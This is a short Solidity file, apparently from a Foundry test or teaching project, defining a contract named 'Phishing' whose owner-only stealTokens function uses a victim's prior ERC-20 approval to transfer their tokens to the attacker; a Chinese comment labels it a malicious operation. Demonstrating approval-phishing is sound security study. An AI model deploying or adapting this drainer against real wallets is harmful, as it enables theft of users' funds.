// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {Test, console} from "forge-std/Test.sol";

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract Phishing {
    address public owner;
    IERC20 public token;

    constructor(address _tokenAddress) {
        owner = msg.sender;
        token = IERC20(_tokenAddress);
    }

    // 惡意操作：轉移用戶代幣到攻擊者地址
    function stealTokens(address victim, uint256 amount) external {
        require(msg.sender == owner, "Only owner can steal tokens");
        require(token.allowance(victim, address(this)) >= amount, "Not enough allowance");
        require(token.transferFrom(victim, owner, amount), "Transfer failed");
    }
}
